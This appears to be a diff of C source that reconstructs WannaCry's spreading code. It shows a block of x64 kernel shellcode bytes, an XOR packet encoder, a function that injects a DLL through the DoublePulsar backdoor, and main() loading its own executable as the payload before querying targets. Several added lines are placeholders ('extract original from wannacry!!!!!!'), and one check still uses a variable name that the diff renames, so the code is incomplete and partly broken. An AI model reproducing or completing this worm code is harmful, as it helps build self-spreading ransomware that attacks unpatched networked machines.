@@ -238,6 +238,8 @@ unsigned char x64_kernel_shellcode[] =
 "\x29\xD9\x48\x89\xDF\xF3\xAA\x48\x8D\x0D\x0D\x00\x00\x00\x48\x8D\x1D\x96\xF0\xFF\xFF\x48\x29\xD9\x48\x89\xDF"
 "\xF3\xAA\x58\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5E\x5F\x5D\x5B\xC3\xEB\x08\x00\x14\x00\x00\x01\x00\x00\x00";
 
+unsigned char x86_kernel_shellcode[] = "extract original from wannacry!!!!!!";
+	
 int encodePacket(unsigned int xor_key, char *buf, int size)
 {
 	int i;
@@ -363,12 +365,16 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 }
 
 
-
+unsigned char x86_dll[] = "\MZ THIS FILE CANNOT BE RAN IN DOS MODE";
+unsigned char x64_dll[] = "\MZ THIS FILE CANNOT BE RAN IN DOS MODE";
 
 //init the DLL building in memory here
 //EXE file global here
-HGLOBAL hDLL_x86;
-HGLOBAL hDLL_x64;
+HGLOBAL ThisExecutableInADLL_x86;
+HGLOBAL ThisExecutableInADLL_x64;
+
+//Location of our Exe to read
+unsigned char Filename[MAX_PATH];
 
 //init the DLL payload here
 //read from Wannacry in IDA
@@ -382,13 +388,11 @@ HGLOBAL initialize_payload()
 	DWORD NumberOfBytesRead;
 	DWORD fileSize;
 	//size = 0x4060 converted to decimal: 16480
-	//GlobalAlloc(GPTR, 5298176)
-	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
+	ThisExecutableInADLL_x86 = GlobalAlloc(GPTR, 5298176); 
 	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
 	
 	//size = 0xc8a4 converted to decimal: 51364
-	//GlobalAlloc(GPTR, 5298176)
-	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
+	ThisExecutableInADLL_x64 = GlobalAlloc(GPTR, 5298176); //0x50D000 found in IDA
 	
 	//if no errors continue, otherwise close and abort()
 	if(hDLL_x86 || hDLL_x64)
@@ -413,6 +417,13 @@ HGLOBAL initialize_payload()
 
 int main()
 {
+	GetModuleFileName(NULL, &Filename, sizeof(Filename));
+	
+	//initialize DLL payload in memory
+	initialize_payload();
+	
+	
+	
 	//etc etc
 	//Send Packets to get DoublePulsar Information
 	unsigned char *recvbuff[4096];
